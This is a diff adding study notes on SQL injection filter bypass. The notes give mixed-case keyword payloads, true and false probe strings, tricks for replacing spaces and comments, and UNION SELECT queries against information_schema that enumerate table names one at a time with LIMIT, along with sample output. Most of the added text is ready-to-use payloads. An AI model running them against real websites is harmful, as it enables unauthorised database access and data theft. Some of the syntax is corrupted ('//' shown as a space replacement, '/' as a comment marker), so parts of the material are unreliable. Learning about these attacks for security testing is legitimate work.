@@ -1374,3 +1374,422 @@ When quotes are blocked:
  Avoid using quotes completely
 
 This technique is commonly used to bypass weak SQL Injection filters.
+
+_______________
+
+
+ SQL Injection Tips & Tricks
+
+While testing for SQL Injection, some websites try to block common SQL keywords using blacklists. They may check for words such as:
+
+```text
+AND
+UNION
+SELECT
+ORDER BY
+spaces
+comments
+```
+
+If any of these keywords are detected, the website may block the request. Fortunately, weak blacklist filters can often be bypassed.
+
+---
+
+ Bypassing Keyword Filters
+
+SQL keywords are case-insensitive, meaning MySQL treats uppercase and lowercase letters the same.
+
+For example, instead of:
+
+```sql
+AND 1=1
+```
+
+you can use:
+
+```sql
+aNd 1=1
+```
+
+or:
+
+```sql
+AnD 111=111
+```
+
+Similarly, instead of:
+
+```sql
+ORDER BY 1
+```
+
+you can write:
+
+```sql
+orDeR bY 1
+```
+
+The query will still execute successfully even if the website blacklists the exact keyword.
+
+
+---
+
+ TRUE Statements for Discovering SQL Injection
+
+These payloads usually return a valid page:
+
+```sql
+aNd 1=1
+```
+
+```sql
+aNd 21=21
+```
+
+```sql
+orDeR bY 1
+```
+
+
+---
+
+ FALSE Statements
+
+These payloads usually return an invalid page or generate a different response:
+
+```sql
+aNd 0=1
+```
+
+```sql
+anD 9=2
+```
+
+```sql
+ordEr bY 1000000000000
+```
+
+
+---
+
+ Replacing Spaces
+
+Some applications block spaces inside URLs.
+
+Normally:
+
+```sql
+orDeR bY 1
+```
+
+You can replace spaces with:
+
+```text
++
+//
+%20
+```
+
+Examples:
+
+```sql
+orDeR+bY+1
+```
+
+```sql
+orDeR//bY//1
+```
+
+```sql
+orDeR%20bY%201
+```
+
+All three perform the same function.
+
+
+---
+
+ UNION SELECT Without Spaces
+
+A normal query:
+
+```sql
+UNION SELECT 1,2
+```
+
+can be rewritten as:
+
+```sql
+uNIoN+sElEcT+1,2
+```
+
+or:
+
+```sql
+uNIoN//sElEcT//1,2
+```
+
+This helps bypass filters that block spaces or exact keywords.
+
+
+---
+
+ SQL Comments
+
+Comments are used to ignore the rest of the SQL query.
+
+Common comment styles include:
+
+```text
+
+%23
+--
+/
+//
+```
+
+Examples:
+
+```sql
+aNd 1=1
+```
+
+```sql
+aNd 1=1--
+```
+
+```sql
+aNd 1=1/
+```
+
+Sometimes you may need to terminate the SQL statement first using a semicolon:
+
+```sql
+aNd 1=1;//
+```
+
+```sql
+aNd 1=1;
+```
+
+
+---
+
+ Quick Reference
+
+ TRUE Statements
+
+```sql
+aNd 1=1
+aNd 21=21
+orDeR bY 1
+```
+
+ FALSE Statements
+
+```sql
+aNd 0=1
+anD 9=2
+ordEr bY 1000000000000
+```
+
+ Space Replacements
+
+```text
++
+//
+%20
+```
+
+ Comment Characters
+
+```text
+
+%23
+--
+/
+//
+```
+
+ Sometimes Required
+
+```sql
+aNd 1=1;//
+aNd 1=1;
+```
+
+
+Blacklist-based filtering is weak because attackers can often bypass it using:
+
+ Mixed uppercase and lowercase letters
+ Alternative space characters
+ Different comment styles
+ Encoded characters
+
+Think of it like a list of names:
+
+| Position | Table Name |
+| -------- | ---------- |
+| 0        | guestbook  |
+| 1        | users      |
+| 2        | accounts   |
+| 3        | logs       |
+
+Normally, this query:
+
+```sql
+UNION SELECT table_name FROM information_schema.tables
+```
+
+returns all table names.
+
+Output:
+
+```text
+guestbook
+users
+accounts
+logs
+```
+
+ The Problem
+
+Some websites are coded to display only one result.
+
+So instead of showing:
+
+```text
+guestbook
+users
+accounts
+logs
+```
+
+they only show:
+
+```text
+guestbook
+```
+
+Even though the database returned all records.
+
+---
+
+ The Solution: LIMIT
+
+We tell SQL exactly which record we want.
+
+ First table
+
+```sql
+UNION SELECT table_name
+FROM information_schema.tables
+LIMIT 0,1
+```
+
+Meaning:
+
+ Start at record 0
+ Show 1 record
+
+Output:
+
+```text
+guestbook
+```
+
+---
+
+ Second table
+
+```sql
+UNION SELECT table_name
+FROM information_schema.tables
+LIMIT 1,1
+```
+
+Meaning:
+
+ Start at record 1
+ Show 1 record
+
+Output:
+
+```text
+users
+```
+
+---
+
+ Third table
+
+```sql
+UNION SELECT table_name
+FROM information_schema.tables
+LIMIT 2,1
+```
+
+Output:
+
+```text
+accounts
+```
+
+---
+
+ Simple Analogy
+
+Imagine a book with 100 pages, but someone only lets you see one page at a time.
+
+You can still read the whole book by saying:
+
+ Show page 0
+ Show page 1
+ Show page 2
+ Show page 3
+
+and so on.
+
+`LIMIT` does exactly that with database records.
+
+---
+
+ What `LIMIT 0,1` means
+
+```sql
+LIMIT start_position, number_of_records
+```
+
+Examples:
+
+```sql
+LIMIT 0,1
+```
+
+= Start at record 0 and show 1 record.
+
+```sql
+LIMIT 5,1
+```
+
+= Start at record 5 and show 1 record.
+
+```sql
+LIMIT 5,3
+```
+
+= Start at record 5 and show 3 records.
+
+---
+
+So in this lecture, the attacker already had a SQL injection and could retrieve table names. The challenge was that the webpage displayed only one row. Using `LIMIT`, they manually viewed table names one at a time by changing:
+
+```sql
+LIMIT 0,1
+LIMIT 1,1
+LIMIT 2,1
+LIMIT 3,1
+```
+
+until they discovered all the tables.
+
